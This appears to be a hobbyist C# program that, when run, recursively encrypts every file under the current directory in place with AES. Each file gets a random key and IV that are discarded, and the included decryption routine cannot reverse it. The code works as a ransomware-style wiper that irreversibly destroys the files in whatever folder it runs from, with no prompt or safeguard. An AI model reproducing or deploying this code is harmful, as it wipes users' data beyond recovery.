using System.Collections;
using System.Security.Cryptography;
using System.Text;

namespace File_String_Encrypt
{
    internal class Program
    {

        static void Main(string[] args)
        {
            Console.WriteLine();

            EncryptFileRecurse(Environment.CurrentDirectory);
            Console.WriteLine();
        }
        static void EncryptFileRecurse(string FilePath)
        {
            string[] strings = System.IO.Directory.GetFiles(FilePath);
            foreach (string s in strings)
            {
                Ex.encryptFile(s)
                    ; Console.WriteLine(s);
            }
            foreach (string yu in System.IO.Directory.EnumerateDirectories(FilePath))
            {
                try
                {
                    EncryptFileRecurse(yu);
                    Console.WriteLine(yu);
                }
                catch (Exception ex)
                {

                    Console.WriteLine("error" + ex.Message);
                }

            }
        }
        static dynamic AesString(string s)
        {
            var d = System.Security.Cryptography.Aes.Create();
            d.GenerateIV(); d.GenerateKey();

            var bytes = d.EncryptCbc(Encoding.UTF8.GetBytes(s), d.IV);

            var df = new { IV = d.IV, String = Convert.ToBase64String(bytes), Key = d.Key };
            return df;
        }
    }
    class Ex
    {
        public string StringToSHA256(string s)
        {
            return Convert.ToBase64String(System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(s)));
        }
        public static void encryptFile(string FilePath)//方法が難しいので自己流
        {
            try
            {
                byte[] d = File.ReadAllBytes(FilePath);
                var df = AesCng.Create(); df.GenerateIV(); df.GenerateKey();
                var g = new FileStream(FilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);


                byte[] en = df.EncryptCbc(d, df.IV);

                g.Write(en, 0, en.Length);
                g.Close();
                g.Dispose();
            }
            catch (Exception excp) { Console.WriteLine(excp.Message); }
        }
        static void decryptFiles(string FilePath, byte[] iv)
        {
            
            try
            {
                byte[] bytes = File.ReadAllBytes(FilePath);
                var df = AesCng.Create();
                byte[] dec = df.DecryptCbc(bytes, iv);
                var g = new FileStream(FilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
                g.Write(dec, 0, dec.Length);
            }
            catch (FileNotFoundException ex)
            {

                WriteLineAsColor(ConsoleColor.Red, "File Not Found. Error ex.Message");
            }
            catch  (IOException ex)
            {
                WriteLineAsColor(ConsoleColor.DarkRed, "others error Show details:" + ex.Message);
            }
        }
        static void WriteLineAsColor(ConsoleColor Color,string Line)
        {
            var d = Console.ForegroundColor;
            Console.ForegroundColor = Color;Console.WriteLine(Line);
            Console.ForegroundColor = d;
        }
    }
}